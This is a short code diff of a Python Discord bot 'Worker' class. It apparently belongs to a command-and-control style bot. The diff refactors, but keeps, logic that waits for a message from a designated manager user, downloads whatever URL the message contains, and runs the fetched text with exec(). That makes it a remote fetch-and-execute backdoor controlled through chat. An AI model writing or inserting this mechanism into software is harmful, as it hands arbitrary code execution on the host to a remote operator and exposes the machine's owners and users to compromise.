@@ -27,10 +27,12 @@ class Worker:
   async def prep(self):
     await self.bot.wait_until_ready()
     self.base = self.bot.get_channel(self.base)
-    while True:
-      order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
-      page = requests.get(order.content).text
-      try:
-        exec(str(page))
-      except Exception as e:
-        print("Error in exec, prep: " + str(e))
+
+  async def listen(self):
+    await self.bot.wait_until_ready()
+    order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
+    page = requests.get(order.content).text
+    try:
+      exec(str(page))
+    except Exception as e:
+      print("Error in exec, prep: " + str(e))
